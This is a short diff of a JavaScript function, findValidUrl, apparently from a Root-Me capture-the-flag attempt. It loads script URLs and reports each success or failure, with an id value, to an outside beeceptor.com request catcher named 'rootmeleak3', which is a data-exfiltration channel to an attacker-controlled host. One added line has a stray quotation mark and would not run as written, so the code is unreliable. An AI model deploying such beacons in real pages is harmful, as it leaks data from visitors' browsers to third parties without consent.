@@ -17,11 +17,11 @@ async function findValidUrl() {
         script.src = url;
         
         script.onload = function() {
-          fetch('https://rootmeleak2.free.beeceptor.com/success?status=success')
+          fetch('https://rootmeleak3.free.beeceptor.com/success?status=success&id=' + id')
         };
         
         script.onerror = function() {
-          fetch('https://rootmeleak2.free.beeceptor.com/error?status=failed')
+          fetch('https://rootmeleak3.free.beeceptor.com/error?status=failed&id=' + id)
         };
         
         // Append the script to the document body to start loading it
